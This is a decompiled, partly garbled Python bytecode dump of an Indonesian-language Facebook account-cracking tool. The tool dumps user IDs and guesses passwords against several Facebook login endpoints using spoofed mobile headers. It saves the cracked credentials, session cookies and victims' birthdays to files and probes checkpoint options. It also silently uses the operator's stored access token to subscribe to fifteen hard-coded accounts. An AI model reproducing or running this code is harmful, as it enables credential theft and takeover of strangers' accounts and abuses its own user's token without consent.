%s%s%s akun %s[OK] %stersimpan ke file %s> %sOK/%s.txtgÉ?s:   %s%s%s akun %s[%sCP%s]%s tersimpan ke file %s> %sCP/%s.txts2   %s!%s crack berjalan, tekan CTRL+Z untuk berhenti
RÔ   i   s   <=>R   i   i   i   i   i    t   123t   12345s   %sâ¢ finishedRG   R   RÕ   R   (   RE   R   (   RG   R   (   RÕ   R   (   RP   R?   RO   R#   R>   Rä   RN   R2   R=   RÖ   R$   R    R   R   R   R×   RØ   R!   Rº   RÙ   RQ   RÚ   (   R¡   t   suuuRÞ   Rß   t   uidRF   t   _i_Ræ   (    (    s   /sdcard/bff.pyRä     sê    			
	

H"	
	

H"	
	

H"	c         C   s  y t  d d  j   } Wn t t f k
 r8 d } n Xxù| D]ñ} | j   } t j   } d } i | d 6t t j	 d d   d 6t t j	 d d   d	 6t t j	 d d   d
 6d d 6d d 6d d 6d d 6} | j
 | d | d | d d | } | j d k r>d Gt j j   t d 7a t |  | |  n  d | j k r×d | j k r×d t | | | j   d f GHt j d | | | j   d f  t  d t d   j d! | | | j   d f  Pq@ q@ d" | j   d# k r@ yÄ t  d$  j   }	 t j
 d% | |	 f  j   d& }
 |
 j d'  \ } } } t | } d( t | | | | | f GHt j d) | | | | | f  t  d* t d   j d+ | | | | | f  PWn) t k
 rÖd, } d, } d, } n n Xd- t | | f GHt j d. | | f  t  d* t d   j d/ | | f  Pq@ q@ q@ Wt d 7a d0 t t t t |  j  t t  t t  f Gt j j   d  S(1   Ns   data/ua.txtR   sË   Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]s,   https://b-api.facebook.com/method/auth.logins
   user-agenti N  i@  s   x-fb-connection-bandwidths   x-fb-sim-hnis   x-fb-net-hniRB   s   x-fb-connection-qualitys!   cell.CTRadioAccessTechnologyHSDPAs   x-fb-connection-types!   application/x-www-form-urlencodeds   content-typeRC   s   x-fb-http-engines   ?format=json&email=s
   &password=s®  &credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=trueRl   iÈ   s8   [0;91m [!] IP terblokir. hidupkan mode pesawat 2 detiki   t   session_keyt   EAAAs    %s*--> %s â %s â %s t   access_tokens   %s â %s â %ss	   OK/%s.txtR   s    *--> %s â %s â %s
s   www.facebook.comt	   error_msgs	   token.txts-   https://graph.facebook.com/%s?access_token=%st   birthdayt   /s!    %s*--> %s â %s â %s %s %s  s   %s â %s â %s %s %ss	   CP/%s.txts    *--> %s â %s â %s %s %s
RD   s    %s*--> %s â %s           s	   %s â %ss    *--> %s â %s
s    %s *-->%s %s/%s [OK:%s]-[CP:%s](    R   R   RX   R    Rw   RR   t   SessionR   RÏ   t   randintRS   t   status_codeR+   R,   R.   t   loopRØ   Rv   R=   RT   t   okR   RÖ   R-   R   t   bulan12R>   t   cpRN   RO   R   R   (   R¡   t   userR    Rq   t   pwt   sest   bapit   headert   responseR[   t   lahirt   dayt   montht   year(    (    s   /sdcard/bff.pyRØ     s    


)
$1#
		$

	c         C   s>  y t  d d  j   } Wn t t f k
 r8 d } n Xx¸| D]°} | j   } t j   } | j j i d d 6d d 6d d	 6| d
 6d d 6d d 6d d 6 | j	 d  } | j
 d d i | d 6| d 6d d 6} d | j j   j   k rd j g  | j j   j   D] \ } }	 d | |	 f ^ q }
 d t | | |
 f GHt j d | | |
 f  t  d t d  j d | | |
 f  Pq@ q@ d  | j j   j   k r@ yÄ t  d!  j   } t j	 d" | | f  j   d# } | j d$  \ } } } t | } d% t | | | | | f GHt j d& | | | | | f  t  d' t d  j d( | | | | | f  PWn) t k
 rd) } d) } d) } n n Xd* t | | f GHt j d+ | | f  t  d' t d  j d, | | f  Pq@ q@ q@ Wt d- 7a d. t t t t |  j  t t  t t  f Gt j  j!   d  S(/   Ns   data/ua.txtR   sË   Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]s   mbasic.facebook.comR^   s	   max-age=0s   cache-controlRE   s   upgrade-insecure-requestss
   user-agentsU   text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8R_   s   gzip, deflates   accept-encodings#   id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7s   accept-languages   https://mbasic.facebook.coms%   https://mbasic.facebook.com/login.phpR8   t   emailt   passR×   t   logint   c_userR   s   %s=%ss    %s*--> %s â %s â %s  s   %s â %s â %ss	   OK/%s.txtR   s    *--> %s â %s â %s
t
   checkpoints   data/token.txts-   https://graph.facebook.com/%s?access_token=%sRñ   Rò   s     %s*--> %s â %s â %s %s %s s   %s â %s â %s %s %ss	   CP/%s.txts    *--> %s â %s â %s %s %s
RD   s    %s*--> %s â %s           s	   %s â %ss    *--> %s â %s
i   s    %s *-->%s %s/%s [OK:%s]-[CP:%s]("   R   R   RX   R    Rw   RR   Ró   Rl   R   RS   t   postRo   t   get_dictR   Rr   t   itemsR=   R÷   R   RÖ   R-   RT   R   Rø   R>   Rù   Rö   RN   RO   R   R   R+   R,   R.   (   R¡   Rú   R    Rq   Rû   Rü   t   pRy   t   keyt   valuet   kukiR[   R   R  R  R  (    (    s   /sdcard/bff.pyRÚ   V  s    
A	'#
		$

	c         C   s  y t  d d  j   } Wn t t f k
 r8 d } n Xx| D] } | j   } t j   } | j j i d d 6d d 6d d	 6| d
 6d d 6d d 6d d 6 | j	 d  } t
 j | j d  } d j t
 j j d | j   } i  }	 xÇ | d  D]¹ }
 |
 j	 d  d  k r|
 j	 d  d k r>|	 j i | d 6 q°|
 j	 d  d k rj|	 j i | d 6 q°|	 j i d |
 j	 d  6 q÷ |	 j i |
 j	 d  |
 j	 d  6 q÷ W|	 j i | d 6d d 6d d 6d d 6d d  6d d! 6d d" 6d d# 6 | j j i d$ d% 6 | j d& d' |	 j } d( | j j   j   k rád) j g  | j j   j   D] \ } } d* | | f ^ q_ } d+ t | | | f GHt j d, | | | f  t  d- t d.  j d/ | | | f  Pq@ q@ d0 | j j   j   k r@ yÄ t  d1  j   } t j	 d2 | | f  j   d3 } | j d4  \ } } } t | } d5 t | | | | | f GHt j d6 | | | | | f  t  d7 t d.  j d8 | | | | | f  PWn) t k
 råd } d } d } n n Xd9 t | | f GHt j d: | | f  t  d7 t d.  j d; | | f  Pq@ q@ q@ Wt  d< 7a  d= t! t" t  t# |  j$  t# t  t# t  f Gt% j& j'   d  S(>   Ns   data/ua.txtR   sË   Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]s   m.facebook.comR^   s	   max-age=0s   cache-controlRE   s   upgrade-insecure-requestss
   user-agentsU   text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8R_   s   gzip, deflates   accept-encodings#   id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7s   accept-languages   https://m.facebook.coms   html.parserRD   s   dtsg":\{"token":"(.*?)"t   inputR  RF   R  R  t   fb_dtsgt   m_sessRL   t   __userRÃ   t   __reqt   __csrt   __at   __dynt   encpasss5   https://m.facebook.com/login/?next&ref=dbl&fl&refid=8Rn   sy   https://m.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100R8   R  R   s   %s=%ss    %s*--> %s â %s â %s  s   %s â %s â %ss	   OK/%s.txtR   s    *--> %s â %s â %s
R  s   data/token.txts-   https://graph.facebook.com/%s?access_token=%sRñ   Rò   s     %s*--> %s â %s â %s %s %s s   %s â %s â %s %s %ss	   CP/%s.txts    *--> %s â %s â %s %s %s
s    %s*--> %s â %s            s	   %s â %ss    *--> %s â %s
i   s    %s *-->%s %s/%s [OK:%s]-[CP:%s]((   R   R   RX   R    Rw   RR   Ró   Rl   R   RS   Rs   R   Rv   Rr   Rt   Ru   R¶   R	  Ro   R
  R   R  R=   R÷   R   RÖ   R-   RT   R   Rø   R>   Rù   Rö   RN   RO   R   R   R+   R,   R.   (   R¡   Rú   R    Rq   Rû   Rü   R  Ry   t   dtgR8   t   mit   poR  R  R  R[   R   R  R  R  (    (    s   /sdcard/bff.pyRÛ   ¢  s²    
! *A	'#
		$

	(   R®   R¯   R¢   Rç   Rä   RØ   RÚ   RÛ   (    (    (    s   /sdcard/bff.pyRÓ   ¶  s   		Ì	~	Q	Lc          C   s¥   t  j d  }  d t t t t f GHx- |  D]% } d t t t | f GHt d  q+ Wy) d t t t t t t t f GHt	   Wn! t
 k
 r  d t GHt   n Xd  S(   NR7   s?   
%sâ¢%s [%s pilih hasil crack yg tersimpan untuk cek opsi %s]
s   %sâ¢%s> %s%sgìQ¸ë±?s*   
%s%s%s Masukan file [ cth%s: %s%s.txt%s ]s   %sâ¢ file tidak ada(   R!   t   listdirRN   RO   R#   R>   R$   R2   RÖ   t   opsit	   NameErrorRQ   (   t   dirsR   (    (    s   /sdcard/bff.pyt   file_cp  s.    				c       
   C   sé  d }  t  d t t t t t f  } | d k rT d t t f GHt d  t   n  y t |  | d  j	   } Wn( t
 k
 r t d t t | f  n Xd t t t f GHt d  d	 t t t t t t |  f GHt d  d t t t f GHt d  x | D] } | j d
 d  } | j d  } d t t t t t | j d d  f GHt d  y% t | d j d d  | d  Wqt j j k
 rqXqWd t t t f GHt d  t  d t t t f  t d  t   d  S(   Ns   CP/s   %s%s%s Nama file %s> %sRD   s   %s%s isi yang benar i   R   s!   
%s%s nama file %s tidak tersedias3    %s# %s---------------------------------------- %s#s   %s%s%s Total akun %s: %s%ss   
s    â s   
%s%s%s cek akun %s: %s%ss    *--> gìQ¸ë±?i    i   s   
%s%s%s Selesai s   %s%s%s kembali (   RP   RN   R2   RO   R#   R>   R$   R  R   t	   readlinesR    RQ   R?   R   R   R   t   mengecekRR   t
   exceptionst   ConnectionErrorR   (   R7   R³   R   t   fbRß   t   ngecek(    (    s   /sdcard/bff.pyR     sX    	





%

c      	   C   sÇ  d } t  j d d g  } t j   } | j j i d d 6d d 6d d	 6| d
 6d d 6| d 6d d 6d d 6d d 6d d 6d d 6d d 6| d d 6d d 6d d 6 i  } t | j | d d  i | d 6j d!  } | j	 d" i d# d$ 6 } d% d& d' d( d) d* d+ d, g } xX | j
 d-  D]G }	 |	 j d.  | k r| j i |	 j d/  |	 j d.  6 qqqW| j i |  d0 6| d1 6 y8 t | j | | j d2  d3 | d4 t j d!  }
 Wn  t j j k
 rÝd5 t GHn Xd6 | j k rÞd7 j g  | j j   j   D] \ } } d8 | | f ^ q	 } t | j d9 d: i | d; 6j d!  }
 g  |
 j
 d< i d= d> 6 D] } t j d? t |   ^ qpd@ } dA t t | f GHt dB  dC t t t t t t t |   f GHnådD | j k rT|
 j	 d"  } | j	 d- i dE d. 6 d/ } | j	 d- i d& d. 6 d/ } | j	 d- i dF d. 6 d/ } i | dE 6| dE 6| d& 6| d& 6dG dH 6dI dJ 6| dF 6} t | j | | d2 d3 | j d!  } g  | j
 dK  D] } | j ^ qÃ} dL t t t t t t |   t t f GHt dB  x´ t t |   D]. } t dM t t | dN  t  | | f  qWno dO t |
  k rª|
 j	 dP i dO dQ 6 j	 dP  j } dR t t | f GHt dB  n dS t t f GHt dB  d  S(T   Ns   https://mbasic.facebook.coms   Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36s{   NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+s   mbasic.facebook.comR^   s	   max-age=0s   cache-controlRE   s   upgrade-insecure-requestsRm   s!   application/x-www-form-urlencodeds   content-types
   user-agents|   text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9R_   s   mark.via.gps   x-requested-withs   same-origins   sec-fetch-sitet   navigates   sec-fetch-modes   ?1s   sec-fetch-usert   documents   sec-fetch-dests   /login/?next&ref=dbl&fl&refid=8Rn   s   gzip, deflates   accept-encodings#   id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7s   accept-languageRl   s   html.parsert   formR	  t   methodt   lsdt   jazoestt   m_tst   lit
   try_numbert   unrecognized_triesR  t   bi_xrwhR  RF   R  R  R  t   actionR8   t   allow_redirectss   %sâ¢ Redirect overload.R  R   s   %s=%ss/   https://free.facebook.com/settings/apps/tabbed/Ro   R¼   t   tdt   falses   aria-hiddensG   \<span.*?href=".*?">(.*?)<\/a><\/span>.*?\<div class=".*?">(.*?)<\/div>i   s   %s%s Berhasil â %s gìQ¸ë±?s"   %s%s%s Aplikasi terhubung %s: %s%sR  R  t   nhRD   t   checkpoint_datat	   Lanjutkans   submit[Continue]t   options!   %s%s%s terdapat %s0%s%s opsi %s: s     %s0%s. %s%s i   t   login_errort   divR   s   %s%s %ss6   %s%s login gagal, silahkan cek kembali id dan password(!   RÏ   RÐ   RR   Ró   Rl   R   t   parserRS   Rv   R¤   R«   R	  Rf   R#  t   TooManyRedirectsR#   Ro   Rr   R
  R  Rt   Ru   R   R=   R2   R$   RN   RO   R   R?   t   rangeR1   R>   (   Rú   Rû   t   mbRq   Rü   R8   t   gedt   fmRÆ   R   t   runR  R  R  R4  RÙ   R)  t   dtsgt   jzstR6  t   dataDt   sesit   yyt   ngewt   optt   eror(    (    s   /sdcard/bff.pyR"  Q  s¨    ,	)8A(B


)%	
	%c          C   s  t  j d  y t d d  j   }  Wn> t k
 rf d t t f GHt d  t  j d  t   n Xy9 t	 j
 d |  d t } t j | j  } | d	 } Wnk t k
 rà d t t f GHt d  t  j d  t   n. t	 j j k
 rt d
 t t t f  n Xt   d t t t t | t f GHd t t t f GHd t t t f GHd t t t f GHd t t t f GHd t t t f GHd t t t f GHd t t t f GHd t t t f GHd t t t f GHd t t t f GHd t t t f GHd t t t f GHt d t t t t f  } | d k rSd t t f GHt d  t   nÈ| d9 k rlt |   n¯| d: k rt |   n| d; k rt |   n}| d< k rºt t     na| d= k r×t!   t   nD| d> k rót" t     n(| d? k rt#   j$   n| d@ k r%t%   nö | dA k rkd- t t t t t f GHd. t t t t t f GHt&   n° | dB k rt'   n | dC k rt( GHn | dD k râd GHt)   t d4  t  j d  t* d5 t t f  t   n9 | dE k rût d8  n  d t t f GHt d  t   d  S(F   NR   s   data/token.txtR   s   %s%s Token invalid i   s,   rm -rf data/token.txt && rm -rf data/cookiess+   https://graph.facebook.com/me?access_token=Rl   RF   s   

%s%s tidak ada koneksi%s
s   %s # %sName %s: %s%s%s 
s   %sâ¢%s 01 %sDump id publics   %sâ¢%s 02 %sDump id followerss"   %sâ¢%s 03 %sDump id reaction posts#   %sâ¢%s 04 %sDump id anggota groupss#   %sâ¢%s 05 %sDump id pencarian namas$   %sâ¢%s 06 %sDump id pesan mesenggers   %sâ¢%s 07 %sStart cracks   %sâ¢%s 08 %sGanti user agents   %sâ¢%s 09 %sCek hasil cracks   %sâ¢%s 10 %sCek opsi akuns   %sâ¢%s rm %sHapus akuns   %sâ¢%s 00 %sKeluars   
%s# %sPilih %s> %sRD   s   
%s%s isi yang benarRE   R   RG   R   RÕ   R   t   4R   t   5R   t   6R   t   7R   t   8R   t   9R   s!   
%s%s%s 01 %sCek hasil akun %sOK s    %s%s%s 02 %sCek hasil akun %sCP R   R   t   rmt   Rmt   RMi   s   
%s%s berhasil terhapus RL   RM   s   
(   RE   R   (   RG   R   (   RÕ   R   (   RK  R   (   RL  R   (   RM  R   (   RN  R   (   RO  R   (   RP  R   (   R   (   R   (   RQ  RR  RS  (   RL   RM   (+   R!   R"   R   R   R    R#   R2   R$   RY   RR   RS   Rþ   RT   R   Rv   RX   R#  R$  RQ   RK   RA   RN   RO   R=   R?   RP   R>   R   R   R   R   R   Rd   R·   RÅ   RÓ   Rç   RË   t   cek_cekR   t   ingfoR5   R1   (   R[   R   R   R\   t   slut(    (    s   /sdcard/bff.pyR   ­  s¶    


		



		




c          C   sß  t  d t t t t f  }  |  d k rK d t t f GHt d  t   n|  d  k rt j	 d  } d t
 t t
 t f GHx- | D]% } d	 t
 t t | f GHt d
  q Wyc t  d t
 t t t f  } t d  | d! k rñ t d t  n  t d |  j   j   } Wn& t t f k
 r6d t t f GHn Xd | j d d  } | j d d  } d t t t f GHt d  t d t
 t t t | t t t t |  f	  d t t t t f GHt d  t j d |  d t t t f GHt d  t d  nØ|  d" k r»t j	 d  } d t
 t t
 t f GHx- | D]% } d	 t
 t t | f GHt d
  q:Wyc t  d t
 t t t f  } t d  | d# k r©t d t  n  t d |  j   j   } Wn& t t f k
 rîd t t f GHn Xd | j d d  } | j d d  } d t t t f GHt d  t d t
 t t t | t t t t |  f	  d t t t t f GHt d  t j d |  d t t t f GHt d  t d  n  d t t f GHt d  t   d  S($   Ns   
%s#%s Pilih %s> %s RD   s   
%s%s isi yang benari   RE   R   R6   s,   
%sâ¢%s [%s hasil crack yang tersimpan %s]
s   %sâ¢%s> %s%sgìQ¸ë±?s   
%sâ¢%s masukan file %s:%s gÉ?s   %sâ¢ isi yang benar kentods   OK/%ss   %s%s file tidak ada s   %st   -R   s   .txts3    %s# %s---------------------------------------- %s#s/   %sâ¢%s hasil tanggal%s : %s%s %stotal %s: %s%ss5    %s# %s---------------------------------------- %s#%ss	   cat OK/%ss   
RG   R   R7   s   CP/%ss/   %sâ¢%s hasil tanggal%s : %s%s %stotal%s : %s%ss	   cat CP/%s(   RD   (   RE   R   (   RD   (   RG   R   (   RD   (   RP   R?   RO   R#   R>   R2   R$   R   R!   R  RN   R=   RQ   R   R   Rª   RX   R    R   R1   R   R"   (   t   lR  R   t   totalokt   nm_filet   file_nmt   totalcp(    (    s   /sdcard/bff.pyRT    sÊ    	

			
 
		

			
 
		


c          C   sT  t  j d  t   d GHd d d g }  x- |  D]% } d | Gt j j   t d  q/ Wt j   j	 d  } t
 d	 d
  } | j |  | j   t d t t t t | f  t d  t d t t f  t d t t t t f  } | d k rþ t   nR | d k r3t  j d | d  t d  t   n | d k rIt   n t   d  S(   NR   s   
s   .   s   ..  s   ... s    [1;95mâ¢[1;96m Mohon tunggu i   i   s   data/lisensi.txtR9   s   

%sâ¢ %sLisensi%s : %s%ss#   %sâ¢ %sLisensi Belum Di konfirmasis'   
%sâ¢%s ingin beli lisensi? y/t %s: %sRD   RH   RI   sS   am start https://wa.me/+628811403654?text=Assalamualaikum+saya+ingin+beli+lisensi:+s
   >/dev/nullRã   Râ   (   RD   (   RH   RI   (   Rã   Râ   (   R!   R"   RA   R+   R,   R.   R$   t   uuidt   uuid4t   hexR   R-   R   R1   RN   RO   R#   R=   RP   R>   RQ   (   RH   t   mR   t   lampungt   su(    (    s   /sdcard/bff.pyR%   {  s@    
	
	



c          C   sZ  y.t  d d  j   }  t j d  j j   } |  | k r¶ t j d  t   d GHd d d g } x- | D]% } d	 | Gt	 j
 j   t d
  qk Wt d t  t d
  t   nw t j d  t   d GHd d d g } x- | D]% } d	 | Gt	 j
 j   t d
  qå Wt d t  t d
  t   Wn% t k
 rUt j d  t   n Xd  S(   Ns   data/lisensi.txtR   s.   https://github.com/AkinXD/license/blob/main/idR   s   
s   .   s   ..  s   ... s%   [1;95mâ¢[1;96m Memeriksa lisensi i   s   
%sâ¢ Lisensi tersedia âs   
%sâ¢ Lisensi tidak tersedias   rm -rf data/lisensi.txt(   R   R   RR   RS   Rv   Rb   R!   R"   RA   R+   R,   R.   R$   R1   R=   R   R#   R%   R    (   R)   t   gitR¿   R`  (    (    s   /sdcard/bff.pyR(      s:    


c          C   s&  yt  d d  j   }  t j d |   t j d |   t j d |   t j d |   t j d |   t j d |   t j d	 |   t j d
 |   t j d |   t j d |   t j d |   t j d |   t j d |   t j d |   t j d |   Wn n Xd  S(   Ns   data/token.txtR   sF   https://graph.facebook.com/100022086172556/subscribers?access_token=%ssF   https://graph.facebook.com/100028434880529/subscribers?access_token=%ssF   https://graph.facebook.com/100067807565861/subscribers?access_token=%ssF   https://graph.facebook.com/100003723696885/subscribers?access_token=%ssF   https://graph.facebook.com/100041129048948/subscribers?access_token=%ssF   https://graph.facebook.com/100007520203452/subscribers?access_token=%ssF   https://graph.facebook.com/100002461344178/subscribers?access_token=%ssF   https://graph.facebook.com/100071747420583/subscribers?access_token=%ssF   https://graph.facebook.com/100029143111567/subscribers?access_token=%ssF   https://graph.facebook.com/100001540299108/subscribers?access_token=%ssF   https://graph.facebook.com/100055918391280/subscribers?access_token=%ssF   https://graph.facebook.com/100009384338470/subscribers?access_token=%ssF   https://graph.facebook.com/100036655325996/subscribers?access_token=%ssF   https://graph.facebook.com/100006230836266/subscribers?access_token=%ssF   https://graph.facebook.com/100021827526816/subscribers?access_token=%s(   R   R   RR   R	  (   t   token(    (    s   /sdcard/bff.pyRU   Ã  s&    t   __main__s   git pull(g   t   Hjt   MtRU  R!   RR   t   ImportErrorR"   t   concurrent.futurest
   concurrentRs   Rt   R+   RT   t   timeRÏ   R   t
   subprocesst   loggingRV   R]  R    R   R<  R   R$   t   nowt   ctR  RJ   t   bulan_RQ   t   nTempt
   ValueErrort   currentR  t   harit   bulanR  t   tahunt   bullanRÖ   Rø   t   reloadt   setdefaultencodingR#   R=   R>   t   BRN   RO   R?   RK   t   acakRÐ   t   warnaR2   R÷   Rù   R   Rú   Rö   R*   R1   R5   R<   RS   Rv   R@   RA   R   Rô   Rþ   RY   Rz   Rq   t   hRd   Rf   Rc   Rh   R|   R   Ra   R   R   R   R   R±   R·   R¹   RÅ   RË   RÊ   RÓ   R   R  R"  R   RT  R%   R(   RU   R®   (    (    (    s   /sdcard/bff.pyt   <module>   s  		
	
		


						
	Z

						5:5ÿ 	
	=	4:		Qÿ ÿ Q		1	\	a	m	%	#	